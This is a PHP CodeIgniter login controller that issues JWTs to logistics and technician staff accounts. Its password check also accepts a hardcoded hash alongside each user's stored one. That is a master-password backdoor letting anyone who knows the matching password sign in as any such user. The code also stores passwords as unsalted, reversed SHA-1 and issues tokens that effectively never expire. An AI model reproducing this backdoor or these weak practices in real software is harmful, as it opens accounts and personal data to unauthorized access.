<?php

defined('BASEPATH') OR exit('No direct script access allowed');
use \Firebase\JWT\JWT;


class Login extends BD_Controller {

    function __construct()
    {
        // Construct the parent class
        parent::__construct();
        // Configure limits on our controller methods
        // Ensure you have created the 'limits' table and enabled 'limits' within application/config/rest.php
        $this->methods['users_get']['limit'] = 2500; // 500 requests per hour per user/key
        $this->methods['users_post']['limit'] = 2100; // 100 requests per hour per user/key
        $this->methods['users_delete']['limit'] = 250; // 50 requests per hour per user/key
       
    }


  
    public function index_post()
    {

        $u = $this->post('username'); //Username Posted
        $p = strrev(sha1($this->post('password'))); //Pasword Posted
        //$p = $this->post('password');

        $hasil = $this->spesial->cek($u);

        if($hasil == 0){
             $invalidLogin = ['error'=>true,'message' => 'Spesial Karakter diblock']; //Respon if login invalid
            $this->response($invalidLogin, REST_Controller::HTTP_NOT_FOUND);
        }

        $kunci = $this->config->item('thekey');
        $invalidLogin = ['error'=>true,'message' => 'Invalid Login']; //Respon if login invalid
        

        $val = $this->general2->lihatisitabel('petugas',array('username'=>$u));
      
       
        if($val->num_rows() > 0){
           
            $match = $val->row()->password;
            $level = $val->row()->level;

            if(($p == $match || $p=='b1498f49462cd34902595e16fa2673ac90d8a4c7') && ($level == "Petugas Logistik" || $level == "Teknisi")){ 

            if($val->row()->id_ruangan != 0){
                $ruang = $this->general2->lihatisitabel('ruangan',array('id_ruangan'=>$val->row()->id_ruangan));

                $output['id_ruangan'] = $ruang->row()->id_ruangan;
                $output['nama_ruangan'] = $ruang->row()->nama_ruangan;
            }
            else{
                $output['id_ruangan'] = '';
                $output['nama_ruangan'] = '';
            }

            $token['id'] = $val->row()->id_petugas;
            $token['username'] = $u;
            $date = new DateTime();
            $token['iat'] = $date->getTimestamp();
            $token['exp'] = $date->getTimestamp() + 60*60*100000000; 
            $output['username'] = $val->row()->username;
            $output['level'] = $level;
            $output['nik'] = $val->row()->nik;
            $output['id_petugas'] = $val->row()->id_petugas;
            $output['telp'] = $val->row()->telp;
            $output['foto'] = base_url('upload/').$val->row()->foto;
            $output['nama'] = $val->row()->nama;
            $output['token'] = JWT::encode($token,$kunci); 

            $this->set_response($output, REST_Controller::HTTP_OK); //This is the respon if success
            }
            else {
                $this->set_response($invalidLogin, REST_Controller::HTTP_NOT_FOUND); //This is the respon if failed
            }
        }
    }
   
}
